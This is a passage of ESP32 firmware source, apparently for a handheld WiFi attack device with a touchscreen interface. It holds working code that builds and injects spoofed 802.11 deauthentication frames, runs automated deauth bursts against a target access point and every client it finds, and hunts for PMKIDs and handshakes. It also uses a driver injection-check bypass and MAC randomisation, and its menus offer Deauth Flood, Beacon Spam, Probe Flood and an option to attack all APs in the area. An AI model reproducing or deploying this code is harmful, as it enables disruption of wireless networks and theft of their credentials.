    tft.setTextColor(TFT_WHITE, 0x0841);
    tft.drawString(chStr, statsX + (statsW / 2) + 22, statsY + 20);

    reconLastDrawChannel = currentCh;
  }

  // Update console log (incremental)
  if (newEvents) {
    drawReconConsole(false);  // false = incremental update
    reconLastTotalEvents = totalEvents;
  }
}

// Decode ASCII hex string (e.g. "C0001234") into a raw byte buffer.
// Returns decoded byte count on success, -1 on bad input or overflow.
// Output buffer must be at least maxLen bytes and ideally 4-byte aligned.
static int hexDecodePayload(const char* hex, uint8_t* out, int maxLen) {
  if (!hex || !out || maxLen <= 0) return -1;
  int len = 0;
  while (*hex) {
    if (!*(hex + 1)) return -1;  // odd nibble count → invalid
    char hi = (char)toupper((unsigned char)*hex++);
    char lo = (char)toupper((unsigned char)*hex++);
    auto nibble = [](char c) -> int {
      if (c >= '0' && c <= '9') return c - '0';
      if (c >= 'A' && c <= 'F') return c - 'A' + 10;
      return -1;
    };
    int h = nibble(hi);
    int l = nibble(lo);
    if (h < 0 || l < 0) return -1;  // non-hex char
    if (len >= maxLen)  return -1;  // would overflow
    out[len++] = (uint8_t)((h << 4) | l);
  }
  return len;
}

// Parse MAC address from colon-separated string
static bool macFromString(const char* str, uint8_t* mac) {
  if (!str || !mac) return false;
  int values[6];
  int count = sscanf(str, "%02X:%02X:%02X:%02X:%02X:%02X",
                     &values[0], &values[1], &values[2],
                     &values[3], &values[4], &values[5]);
  if (count != 6) return false;
  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)values[i];
  return true;
}

// Build and transmit a deauthentication frame.  All callers (jammit, auto modes, tests)
// funnel through this helper so we can centralise the "invalid interface" handling that
// shows up when the driver is left in promiscuous mode.  The previous implementation
// duplicated the packet construction twice and blindly tried the AP interface even when
// AT_MODE_NULL/only-promisc was active, which led to the repeated
// "wifi:invalid interface 1" errors seen in the logs.
//
// We now always hand the packet to tryAlternateTx(), which toggles promiscous mode if
// necessary and only attempts the AP interface when WiFi is actually running in AP or
// APSTA mode.  Failure bookkeeping remains the same so the higher‑level logic can
// detect persistent tx problems.
static void sendDeauthFrame(const uint8_t* bssid, const uint8_t* station, uint8_t reason) {
  // Packet buffer must be 4-byte aligned for esp_wifi_80211_tx
  uint8_t deauthPacket[26] __attribute__((aligned(4))) = {
    0xC0, 0x00,  // Frame Control: Deauth
    0x00, 0x00,  // Duration
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination (station)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP)
    0x00, 0x00,  // Sequence
    0x07, 0x00   // Reason code
  };
  
  memcpy(deauthPacket + 4, station, 6);   // Destination
  memcpy(deauthPacket + 10, bssid, 6);    // Source (AP)
  memcpy(deauthPacket + 16, bssid, 6);    // BSSID
  deauthPacket[24] = reason;
  
  int len = sizeof(deauthPacket);
  Serial.printf("[jammit] TX deauth len=%d bytes:", len);
  for (int i = 0; i < len; i++) Serial.printf(" %02X", deauthPacket[i]);
  Serial.println("");

  // Use the helper which will try STA and, if appropriate, AP with promisc toggle.
  esp_err_t txr = tryAlternateTx(deauthPacket, len);

  if (txr != ESP_OK) {
    Serial.printf("[jammit] esp_wifi_80211_tx error=%d\n", (int)txr);
  }
}

// The previous secondary definition was redundant and didn't perform any validity
// checks on the AP interface.  Remove it entirely – the single implementation above
// now covers all callers and routes through tryAlternateTx(), so we don't need two
// copies of the packet logic.

// (duplicate implementation removed; nothing further required)

// Y0INK mode: Full OINK state machine via YoinkEngine
// Replaces the old simple periodic-deauth approach with the NEONDRIVE
// state machine: SCANNING → PMKID_HUNTING → LOCKING → ATTACKING → WAITING
static void yoinkModeTick() {
  if (autoMode != AutoMode::Y0INK) return;

  // Drive the new YOINK engine state machine
  YoinkEngine::update();

  // Sync stats for the HUD display
  yoinkClientCount = YoinkEngine::getClientCount();
  yoinkDeauthCount = YoinkEngine::getDeauthCount();
  yoinkHandshakeCaptureCount = YoinkEngine::getHandshakeCount();
  sniffPacketCount = YoinkEngine::getPacketCount();
}

// ============================================================
// JAMMIT Helpers
// ============================================================

// Log to serial + console ring + SD session log
static void jammitLog(const char* fmt, ...) {
  char buf[128];
  va_list ap;
  va_start(ap, fmt);
  vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);
  Serial.printf("[JAMMIT] %s\n", buf);
  pushConsoleEventf("INFO", "JAMMIT", "%s", buf);
  if (sdReady && jammitSessionLogPath[0] != '\0') {
    File f = SD.open(jammitSessionLogPath, FILE_APPEND);
    if (f) {
      uint32_t elapsed = millis() - jammitSessionStartMs;
      f.printf("[%lu.%03lu] %s\n", elapsed / 1000, elapsed % 1000, buf);
      f.close();
    }
  }
}

// Write a deauth frame record to the JAMMIT deauth PCAP file
static void jammitWriteDeauthToPcap(const uint8_t* bssid, const uint8_t* station, uint8_t reason) {
  if (!sdReady || jammitDeauthPcapPath[0] == '\0') return;
  uint8_t frame[26] __attribute__((aligned(4))) = {
    0xC0, 0x00,  // Frame Control: Deauth
    0x00, 0x00,  // Duration
    0x00,0x00,0x00,0x00,0x00,0x00,  // DA
    0x00,0x00,0x00,0x00,0x00,0x00,  // SA (AP spoofed)
    0x00,0x00,0x00,0x00,0x00,0x00,  // BSSID
    0x00, 0x00,                     // Seq
    0x00, 0x00                      // Reason
  };
  memcpy(frame + 4,  station, 6);
  memcpy(frame + 10, bssid,   6);
  memcpy(frame + 16, bssid,   6);
  frame[24] = reason;
  writePacketToPcapPath(jammitDeauthPcapPath, frame, sizeof(frame));
}

// Create /captures/<SSID_BSSID>/ directory, session log, and deauth PCAP
static void jammitInitSaveFiles() {
  jammitSessionLogPath[0] = '\0';
  jammitDeauthPcapPath[0] = '\0';
  if (!sdReady) {
    Serial.println("[jammit] SD not ready - session files skipped");
    return;
  }
  // Build sanitized SSID (matches startSniff convention)
  char sanitizedSsid[33] = {0};
  if (target.ssid.length() == 0 || target.ssid == "(hidden)") {
    strcpy(sanitizedSsid, "HIDDEN");
  } else {
    for (int i = 0; i < (int)target.ssid.length() && i < 32; i++) {
      char c = target.ssid[i];
      sanitizedSsid[i] = (isalnum(c) || c == '-' || c == '_') ? c : '_';
    }
  }
  // BSSID with dashes for directory name
  char bssidDash[18] = {0};
  size_t bl = target.bssid.length();
  for (size_t i = 0; i < bl && i < 17; i++) {
    char c = target.bssid[i];
    bssidDash[i] = (c == ':') ? '-' : c;
  }
  // Set global captureDir so handleCapturedPacket and initCaptureFiles()
  // write raw/beacon/handshakes.pcap to the right place.
  if (!SD.exists("/captures")) SD.mkdir("/captures");
  snprintf(captureDir, sizeof(captureDir), "/captures/%s_%s", sanitizedSsid, bssidDash);
  if (!SD.exists(captureDir)) SD.mkdir(captureDir);

  // JAMMIT session log + deauth PCAP go directly in the capture dir
  snprintf(jammitSessionLogPath, sizeof(jammitSessionLogPath),
           "%s/jammit_session.log", captureDir);
  snprintf(jammitDeauthPcapPath, sizeof(jammitDeauthPcapPath),
           "%s/jammit_deauths.pcap", captureDir);

  // Write session log header
  File logFile = SD.open(jammitSessionLogPath, FILE_WRITE);
  if (logFile) {
    logFile.printf("JAMMIT session: target='%s' bssid=%s ch=%d\n",
                   target.ssid.c_str(), target.bssid.c_str(), target.channel);
    logFile.close();
    Serial.printf("[jammit] Session log: %s\n", jammitSessionLogPath);
  }

  // Write PCAP global header for deauth frames
  if (SD.exists(jammitDeauthPcapPath)) SD.remove(jammitDeauthPcapPath);
  PcapGlobalHeader pcapHdr;
  File pcapFile = SD.open(jammitDeauthPcapPath, FILE_WRITE);
  if (pcapFile) {
    pcapFile.write((uint8_t*)&pcapHdr, sizeof(pcapHdr));
    pcapFile.close();
    Serial.printf("[jammit] Deauth PCAP: %s\n", jammitDeauthPcapPath);
  }
}

// Set up WiFi in STA + WSL bypass + promiscuous (mirrors YoinkEngine startWifi)
static void startJammitWifi() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  WiFi.softAPdisconnect(true);
  WiFi.persistent(false);
  WiFi.setSleep(false);
  WiFi.mode(WIFI_STA);
  delay(50);
  WiFi.disconnect();
  delay(50);

  if (WSLBypasser::isActive()) {
    jammitLog("WSL bypass: ACTIVE (magic 31337 confirmed)");
  } else {
    jammitLog("WARNING: WSL bypass NOT detected – injection may fail");
  }
  WSLBypasser::randomizeMAC();
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_max_tx_power(82);  // ~20.5 dBm max

  esp_wifi_set_channel((uint8_t)target.channel, WIFI_SECOND_CHAN_NONE);

  esp_wifi_set_promiscuous_rx_cb(&promiscuousPacketCallback);
  wifi_promiscuous_filter_t filt;
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous(true);

  sniffActive = true;
  jammitLog("WiFi ready: STA+promisc+WSL+PS_NONE+TX82 ch=%d", target.channel);
}

// Tear down JAMMIT WiFi and restore STA mode
static void stopJammitWifi() {
  if (wifiOpMutex && xSemaphoreTake(wifiOpMutex, pdMS_TO_TICKS(1000)) == pdTRUE) {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    delay(20);
    WiFi.mode(WIFI_STA);
    delay(20);
    xSemaphoreGive(wifiOpMutex);
  } else {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    WiFi.mode(WIFI_STA);
  }
  sniffActive = false;
}

// JAMMIT auto-mode tick: WSL burst deauth (broadcast + per-client), session log
static void jammitModeTick() {
  if (autoMode != AutoMode::JAMMIT) return;
  if (!sniffActive || !hasTarget) return;

  uint32_t now = millis();
  if (jammitLastTickMs == 0) {
    jammitLastTickMs = now;
    jammitLastPkts = sniffPacketCount;
    jammitLastScore = 0;
    jammitLastDeauthMs = now;
    jammitDeauthCount = 0;
    return;
  }
  if (now - jammitLastTickMs < 1000) return;

  uint32_t delta = sniffPacketCount - jammitLastPkts;
  jammitLastPkts = sniffPacketCount;
  jammitLastTickMs = now;
  jammitLastScore = (delta > 0xFFFF) ? 0xFFFF : (uint16_t)delta;

  if (!cfg.wifi_enableDeauth) return;
  if (now - jammitLastDeauthMs < 2000) return;
  jammitLastDeauthMs = now;

  uint8_t bssid[6] = {0};
  if (!macFromString(target.bssid.c_str(), bssid)) {
    jammitLog("ERROR: Cannot parse target BSSID '%s'", target.bssid.c_str());
    return;
  }

  // 1. Broadcast deauth burst (evicts all stations simultaneously)
  static const uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  WSLBypasser::sendDeauthBurst(bssid, broadcast, 3);
  jammitWriteDeauthToPcap(bssid, broadcast, 7);
  jammitDeauthCount++;

  // 2. Targeted deauth bursts for each discovered client
  uint8_t snapshot[JAMMIT_MAX_CLIENTS][6];
  uint8_t clientSnap = 0;
  portENTER_CRITICAL(&jammitClientMux);
  clientSnap = jammitClientCount;
  if (clientSnap > 0) memcpy(snapshot, jammitClientMacs, clientSnap * 6);
  portEXIT_CRITICAL(&jammitClientMux);

  for (uint8_t i = 0; i < clientSnap; i++) {
    WSLBypasser::sendDeauthBurst(bssid, snapshot[i], 3);
    jammitWriteDeauthToPcap(bssid, snapshot[i], 7);
    jammitDeauthCount++;
    delay(10);  // brief gap between client bursts
  }

  // Periodic log line
  jammitLog("burst bssid=%s clients=%d pps=%u total_deauths=%lu",
            target.bssid.c_str(), (int)clientSnap,
            (unsigned)jammitLastScore, (unsigned long)jammitDeauthCount);
}

// ---------- BRUCE WiFi Attack Menu ----------
static bool bruceMenuShowStats = false;
static int bruceTargetScroll = 0;
static int bruceTargetListTopY = 100;
static int bruceTargetListItemH = 28;
static int bruceTargetListItemsPerScreen = 4;
static int bruceTargetListX = 10;
static int bruceTargetListW = 300;

// Draw the Bruce Set Target selection screen
void drawBruceSetTarget() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("SELECT ATTACK TARGET");

  drawUniversalBackground();
  const int h = tft.height();
  const bool compact = (h <= 180);
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();

  static const char* rowLabels[8] = {"AP1", "AP2", "AP3", "AP4", "AP5", "AP6", "AP7", "AP8"};
  for (int i = 0; i < 8; i++) {
    btnBruceSetTargetRows[i] = {0, 0, 0, 0, rowLabels[i]};
  }
  btnBruceSetTargetAll = {0, 0, 0, 0, "ALL"};
  btnBruceSetTargetUp = {0, 0, 0, 0, "^"};
  btnBruceSetTargetDown = {0, 0, 0, 0, "v"};

  const int controlGap = compact ? 3 : 6;
  int controlW = compact ? 24 : 30;

  bruceTargetListX = content.x;
  int listPanelRight = hypercubeBoxX - 4;
  if (listPanelRight < (content.x + 100)) listPanelRight = content.x + content.w;
  int listPanelW = listPanelRight - bruceTargetListX;
  if (listPanelW < 100) listPanelW = 100;
  if (listPanelW < (controlW + 40)) controlW = 0;

  bruceTargetListW = listPanelW - (controlW > 0 ? (controlW + controlGap) : 0);
  if (bruceTargetListW < 80) bruceTargetListW = 80;

  const int metaY = content.y + 1;
  bruceTargetListTopY = metaY + 12;
  const int listBottom = bottom.y - 14;
  const int listH = max(compact ? 54 : 88, listBottom - bruceTargetListTopY);

  const int desiredRows = compact ? 6 : 5;
  bruceTargetListItemH = clampi((listH - 2) / desiredRows, compact ? 14 : 20, compact ? 20 : 30);
  bruceTargetListItemsPerScreen = clampi(listH / bruceTargetListItemH, 3, 8);

  const int visibleNetworks = max(1, bruceTargetListItemsPerScreen - 1);
  int maxScroll = apCount - visibleNetworks;
  if (maxScroll < 0) maxScroll = 0;
  bruceTargetScroll = clampi(bruceTargetScroll, 0, maxScroll);

  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.setTextSize(1);
  tft.setTextDatum(TL_DATUM);
  char meta[72];
  if (apCount > 0) {
    const int first = bruceTargetScroll + 1;
    const int last = min(apCount, bruceTargetScroll + visibleNetworks);
    snprintf(meta, sizeof(meta), "WiFi Networks: %d  showing %d-%d", apCount, first, last);
  } else {
    snprintf(meta, sizeof(meta), "WiFi Networks: 0  (run scan first)");
  }
  tft.drawString(meta, bruceTargetListX, metaY);

  // "Attack All" row
  const bool allSelected = (bruceHasSelectedTarget && bruceTargetSsid[0] == '\0');
  btnBruceSetTargetAll = {bruceTargetListX, bruceTargetListTopY, bruceTargetListW, bruceTargetListItemH, "ALL"};
  tft.fillRect(btnBruceSetTargetAll.x, btnBruceSetTargetAll.y, btnBruceSetTargetAll.w, btnBruceSetTargetAll.h,
               allSelected ? 0x03A0 : TFT_BLACK);
  tft.drawRect(btnBruceSetTargetAll.x, btnBruceSetTargetAll.y, btnBruceSetTargetAll.w, btnBruceSetTargetAll.h,
               allSelected ? TFT_CYAN : TFT_GREEN);
  tft.setTextColor(allSelected ? TFT_WHITE : TFT_GREEN, allSelected ? 0x03A0 : TFT_BLACK);
  tft.drawString(">> ATTACK ALL APs IN AREA", bruceTargetListX + 4, bruceTargetListTopY + (compact ? 3 : 6));

  // Per-AP rows
  const int rowTextInsetY = compact ? 3 : 6;
  for (int row = 0; row < visibleNetworks; row++) {
    const int apIdx = bruceTargetScroll + row;
    const int rowY = bruceTargetListTopY + bruceTargetListItemH + (row * bruceTargetListItemH);
    if (apIdx < 0 || apIdx >= apCount) {
      tft.fillRect(bruceTargetListX, rowY, bruceTargetListW, bruceTargetListItemH, TFT_BLACK);
      tft.drawRect(bruceTargetListX, rowY, bruceTargetListW, bruceTargetListItemH, TFT_DARKGREY);
      continue;
    }

    btnBruceSetTargetRows[row] = {bruceTargetListX, rowY, bruceTargetListW, bruceTargetListItemH, rowLabels[row]};

    const bool isSelected = (apIdx == apSelected);
    const uint16_t fill = isSelected ? 0x03A0 : TFT_BLACK;
    const uint16_t border = isSelected ? TFT_CYAN : TFT_DARKGREY;
    const uint16_t fg = isSelected ? TFT_WHITE : TFT_YELLOW;

    tft.fillRect(bruceTargetListX, rowY, bruceTargetListW, bruceTargetListItemH, fill);
    tft.drawRect(bruceTargetListX, rowY, bruceTargetListW, bruceTargetListItemH, border);
    tft.setTextColor(fg, fill);

    String ssid = aps[apIdx].ssid.isEmpty() ? String("(hidden)") : aps[apIdx].ssid;
    String rowLine = ssid + " | CH " + String(aps[apIdx].channel) + " | " + String(aps[apIdx].rssi) + "dBm";
    const int rowTextMaxW = bruceTargetListW - 8;
    bool trimmed = false;
    while (rowLine.length() > 4 && tft.textWidth(rowLine) > rowTextMaxW) {
      rowLine.remove(rowLine.length() - 1);
      trimmed = true;
    }
    if (trimmed && rowLine.length() > 3) {
      while (rowLine.length() > 3 && tft.textWidth(rowLine + "...") > rowTextMaxW) {
        rowLine.remove(rowLine.length() - 1);
      }
      rowLine += "...";
    }
    tft.drawString(rowLine, bruceTargetListX + 4, rowY + rowTextInsetY);
  }

  // Scroll controls use the right-side gutter on compact displays.
  if (controlW > 0) {
    const int controlX = bruceTargetListX + bruceTargetListW + controlGap;
    const int controlH = max(bruceTargetListItemH, compact ? 18 : 24);
    const bool canScrollUp = (bruceTargetScroll > 0);
    const bool canScrollDown = (bruceTargetScroll < maxScroll);

    btnBruceSetTargetUp = {controlX, bruceTargetListTopY, controlW, controlH, "^"};
    btnBruceSetTargetDown = {controlX, bruceTargetListTopY + listH - controlH, controlW, controlH, "v"};

    drawButton(btnBruceSetTargetUp,
               canScrollUp ? TFT_DARKGREY : TFT_BLACK,
               canScrollUp ? TFT_CYAN : TFT_DARKGREY,
               canScrollUp ? TFT_WHITE : TFT_DARKGREY);
    drawButton(btnBruceSetTargetDown,
               canScrollDown ? TFT_DARKGREY : TFT_BLACK,
               canScrollDown ? TFT_CYAN : TFT_DARKGREY,
               canScrollDown ? TFT_WHITE : TFT_DARKGREY);

    tft.setTextDatum(MC_DATUM);
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    char scrollInfo[18];
    snprintf(scrollInfo, sizeof(scrollInfo), "%d/%d", bruceTargetScroll + 1, maxScroll + 1);
    tft.drawString(scrollInfo, controlX + (controlW / 2), bruceTargetListTopY + (listH / 2) - 2);
    tft.setTextDatum(TL_DATUM);
  }

  // Bottom bar
  btnBruceSetTargetBack = {bottom.x, bottom.y, bottom.w, UI_BUTTON_H, "Back"};
  drawButton(btnBruceSetTargetBack, TFT_BLACK, TFT_NAVY, TFT_WHITE);

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  String hint = "Tap row to select  |  BTN1 Next  BTN2 Select";
  while (hint.length() > 4 && tft.textWidth(hint) > (content.w - 2)) {
    hint.remove(hint.length() - 1);
  }
  tft.drawString(hint, content.x, bottom.y - 12);

  drawBorder();
}

// The canonical drawBruceMenu implementation lives here so it has access to
// the Button struct, bruceMenuBtns, tft, and all draw helpers.
void drawBruceMenu() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("BRUCE WiFi Attacks");
  drawUniversalBackground();

  const int w = tft.width();
  const int h = tft.height();
  const bool compact = (h <= 180);
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();

  // Status text block
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  int statusY = content.y + 2;
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  if (bruceHasSelectedTarget) {
    if (bruceTargetSsid[0] == '\0') {
      tft.drawString("Target: ALL APs", 8, statusY);
    } else {
      char buf[56];
      snprintf(buf, sizeof(buf), "Target: %.20s [CH%d]", bruceTargetSsid, bruceTargetChannel);
      tft.drawString(buf, 8, statusY);
    }
  } else {
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.drawString("NO TARGET - Press Set Target", 8, statusY);
  }

  if (bruceIsAttacking()) {
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.drawString(bruceGetAttackName(), 8, statusY + 12);
  }

  const int pad = 8;
  const int gap = compact ? 4 : 8;
  const int btnW = (w - pad * 2 - gap) / 2;
  const int gridTop = statusY + (bruceIsAttacking() ? 24 : 14);
  const int rows = 3;
  const int availH = bottom.y - gridTop - 4;
  const int btnH = clampi((availH - (gap * (rows - 1))) / rows,
                          compact ? 20 : 30,
                          compact ? 28 : 40);

  // Attack buttons (top 4)
  bruceMenuBtns[0] = {pad,                gridTop,                    btnW, btnH, "Deauth Flood"};
  bruceMenuBtns[1] = {pad + btnW + gap,   gridTop,                    btnW, btnH, "Beacon Spam"};
  bruceMenuBtns[2] = {pad,                gridTop + btnH + gap,       btnW, btnH, "Probe Flood"};
  bruceMenuBtns[3] = {pad + btnW + gap,   gridTop + btnH + gap,       btnW, btnH, "Deauth All"};
  // Set Target and Back/Stop buttons (bottom row)
  bruceMenuBtns[4] = {pad,                gridTop + ((btnH + gap) * 2), btnW, btnH, "Set Target"};
  bruceMenuBtns[5] = {pad + btnW + gap,   gridTop + ((btnH + gap) * 2), btnW, btnH,
                      bruceIsAttacking() ? "STOP" : "Back"};

  drawButton(bruceMenuBtns[0], TFT_BLACK, 0xFF07, TFT_WHITE);
  drawButton(bruceMenuBtns[1], TFT_BLACK, 0xFF07, TFT_WHITE);
  drawButton(bruceMenuBtns[2], TFT_BLACK, 0xFF07, TFT_WHITE);
  drawButton(bruceMenuBtns[3], TFT_BLACK, 0xF800, TFT_WHITE);
  drawButton(bruceMenuBtns[4], TFT_BLACK, TFT_NAVY, TFT_WHITE);
  drawButton(bruceMenuBtns[5], TFT_BLACK,
             bruceIsAttacking() ? 0xFC00 : 0x07E0, TFT_WHITE);

  drawBorder();
}


// ============================================================
//  Bruce Monitor: capture helpers
// ============================================================

// Called from bruceAttackTick via the TX callback — only enqueues the
// frame into a RAM ring buffer; no SD I/O here.
static void brucePcapFrameCb(const uint8_t* frame, size_t len, uint8_t channel) {
  uint8_t nextHead = (brucePcapQueueHead + 1) % BRUCE_PCAP_QUEUE_SIZE;
  if (nextHead == brucePcapQueueTail) return;  // full, drop frame
  BrucePcapEntry& e = brucePcapQueue[brucePcapQueueHead];
  size_t copyLen = len < sizeof(e.frame) ? len : sizeof(e.frame);
  memcpy(e.frame, frame, copyLen);
  e.len     = (uint8_t)copyLen;
  e.channel = channel;
  e.ts_ms   = millis();
  brucePcapQueueHead = nextHead;
}

static void bruceOpenCaptures() {
  if (!sdReady) {
    brucePcapPath[0] = '\0';
    bruceSessionLogPath[0] = '\0';
    brucePcapFrameCount = 0;
    brucePcapQueueHead = brucePcapQueueTail = 0;
    bruceCaptureWasClosed = false;
    bruceSetFrameCallback(nullptr);
    monitorPushLine(TFT_YELLOW, "SD not ready – no PCAP/log");
    Serial.println("[BRUCE] SD not ready, capture disabled");
    return;
  }

  // Build timestamped session dir under /bruce/
  uint32_t ts = millis();
  char dir[96];
  snprintf(dir, sizeof(dir), "/bruce/%lu", (unsigned long)ts);
  SD.mkdir("/bruce");
  SD.mkdir(dir);

  snprintf(brucePcapPath,       sizeof(brucePcapPath),       "%s/frames.pcap",   dir);
  snprintf(bruceSessionLogPath, sizeof(bruceSessionLogPath), "%s/session.log",   dir);

  // Open PCAP and write global header
  brucePcapFile = SD.open(brucePcapPath, FILE_WRITE);
  if (brucePcapFile) {
    PcapGlobalHeader gh;
    brucePcapFile.write((const uint8_t*)&gh, sizeof(gh));
    brucePcapFile.flush();
  } else {
    brucePcapPath[0] = '\0';
    Serial.printf("[BRUCE] Failed to create %s\n", brucePcapPath);
  }

  // Open session log
  bruceSessionLogFile = SD.open(bruceSessionLogPath, FILE_WRITE);
  if (bruceSessionLogFile) {
    bruceSessionLogFile.printf("=== BRUCE SESSION LOG ===\n");
    bruceSessionLogFile.printf("Attack   : %s\n", bruceGetAttackName());
    bruceSessionLogFile.printf("StartMs  : %lu\n", (unsigned long)ts);
    bruceSessionLogFile.flush();
  } else {
    bruceSessionLogPath[0] = '\0';
    Serial.printf("[BRUCE] Failed to create %s\n", bruceSessionLogPath);
  }

  brucePcapFrameCount  = 0;
  bruceCaptureWasClosed = false;
  brucePcapQueueHead = brucePcapQueueTail = 0;
  bruceSetFrameCallback(brucePcapFrameCb);

  Serial.printf("[BRUCE] Capture open: %s\n", dir);
  uiMemLog("after_start_capture");
}

// Drain the RAM ring buffer to the PCAP file (call from the monitor tick).
static void bruceDrainPcapQueue() {
  while (brucePcapQueueTail != brucePcapQueueHead) {
    BrucePcapEntry& e = brucePcapQueue[brucePcapQueueTail];
    if (brucePcapFile) {
      uint32_t ts_sec  = e.ts_ms / 1000;
      uint32_t ts_usec = (e.ts_ms % 1000) * 1000;
      PcapPacketHeader ph;
      ph.ts_sec   = ts_sec;
      ph.ts_usec  = ts_usec;
      ph.incl_len = e.len;
      ph.orig_len = e.len;
      brucePcapFile.write((const uint8_t*)&ph, sizeof(ph));
      brucePcapFile.write(e.frame, e.len);
      brucePcapFrameCount++;
    }
    brucePcapQueueTail = (brucePcapQueueTail + 1) % BRUCE_PCAP_QUEUE_SIZE;
  }
  if (brucePcapFile) brucePcapFile.flush();
}

static void bruceCloseCaptures() {
  if (bruceCaptureWasClosed) return;
  bruceCaptureWasClosed = true;
  bruceSetFrameCallback(nullptr);
  bruceDrainPcapQueue();

  BruceStats stats = bruceGetStats();
  if (bruceSessionLogFile) {
    bruceSessionLogFile.printf("---\nFramesSent : %lu\n", (unsigned long)stats.framesSent);
    bruceSessionLogFile.printf("ElapsedMs  : %lu\n",   (unsigned long)stats.elapsedMs);
    bruceSessionLogFile.printf("FPS        : %.1f\n",  stats.framesPerSecond);
    bruceSessionLogFile.printf("PcapFrames : %lu\n",   (unsigned long)brucePcapFrameCount);
    bruceSessionLogFile.printf("LastError  : %s\n",    bruceGetLastError());
    bruceSessionLogFile.printf("=== END ===\n");
    bruceSessionLogFile.close();
  }
  if (brucePcapFile) brucePcapFile.close();

  Serial.printf("[BRUCE] Capture closed – %lu frames, %lu pcap frames\n",
                (unsigned long)stats.framesSent, (unsigned long)brucePcapFrameCount);
  uiMemLog("after_stop_capture");
}

// ============================================================
//  Bruce Monitor screen draw — split into initial and incremental
// ============================================================

// Forward declaration
static void drawBruceMonitorTerminal();

// Full screen initialization (called once on setScreen)
static void drawBruceMonitorFull() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("BRUCE MONITOR");
  drawUniversalBackground();

  const int w = tft.width();
  const int h = tft.height();

  // --- Buttons ---
  int btnY = h - 44 + 4;
  int btnH2 = 44 - 8;
  int stopW = (w - 24) * 2 / 3;
  int fileW = (w - 24) - stopW;

  btnBruceMonBack  = {8,          btnY, stopW, btnH2, bruceIsAttacking() ? "STOP" : "BACK"};
  btnBruceMonFiles = {8 + stopW + 8, btnY, fileW, btnH2, "FILES"};

  drawButton(btnBruceMonBack,  TFT_BLACK, bruceIsAttacking() ? TFT_RED   : 0x0380, TFT_WHITE);
  drawButton(btnBruceMonFiles, TFT_BLACK, TFT_NAVY, TFT_WHITE);

  drawBorder();
  
  // Initial status + log draw
  drawBruceMonitorTerminal();
}

// Incremental terminal window update (just the log area + status strip)
static void drawBruceMonitorTerminal() {
  const int w = tft.width();
  const int h = tft.height();

  bool attacking = bruceIsAttacking();
  BruceStats stats = bruceGetStats();

  // --- Attack status strip (below header, 40-64) ---
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.fillRect(0, 40, w, 24, TFT_BLACK);

  if (attacking) {
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.drawString("ACTIVE >", 6, 40);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.drawString(bruceGetAttackName(), 68, 40);
  } else {
    tft.setTextColor(0x7BCF, TFT_BLACK);
    tft.drawString("STOPPED", 6, 40);
  }

  if (attacking) {
    char buf[64];
    snprintf(buf, sizeof(buf), "F:%-6lu FPS:%.0f  T:%lus",
             (unsigned long)stats.framesSent,
             stats.framesPerSecond,
             (unsigned long)(stats.elapsedMs / 1000));
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString(buf, 6, 52);
  }

  // --- Scrolling log box (terminal window) ---
  const int boxY = 66;
  const int btnAreaH = 44;
  const int boxH = h - boxY - btnAreaH;
  const int lineH = 14;
  int visLines = boxH / lineH;
  if (visLines > MONITOR_MAX_LINES) visLines = MONITOR_MAX_LINES;

  // Draw terminal box border
  tft.drawRect(0, boxY, w, boxH, 0x2945);

  // Fill terminal background
  tft.fillRect(1, boxY + 1, w - 2, boxH - 2, TFT_BLACK);

  // Draw log lines
  int startIdx = 0;
  if (monitorLineCount > visLines) startIdx = monitorLineCount - visLines;
  for (int i = 0; i < visLines; i++) {
    int idx = startIdx + i;
    if (idx >= monitorLineCount) break;
    int row = idx % MONITOR_MAX_LINES;
    tft.setTextColor(monitorLines[row].color, TFT_BLACK);
    tft.drawString(monitorLines[row].text, 4, boxY + 2 + i * lineH);
  }

  // Spinner (only while attacking)
  if (attacking) {
    static uint8_t sp = 0;
    static uint32_t spinLastMs = 0;
    uint32_t now = millis();
    if (now - spinLastMs > 100) {
      spinLastMs = now;
      sp = (sp + 1) & 3;
    }
    const char* spinFrames[] = {"|", "/", "-", "\\"};
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString(spinFrames[sp], w - 16, boxY + boxH - 14);
  }
}

static void drawBruceMonitor() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("BRUCE MONITOR");
  drawUniversalBackground();

  const int w = tft.width();
  const int h = tft.height();

  bool attacking = bruceIsAttacking();
  BruceStats stats = bruceGetStats();

  // --- Attack status strip (below header) ---
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.fillRect(0, 40, w, 24, TFT_BLACK);

  if (attacking) {
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.drawString("ACTIVE >", 6, 40);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
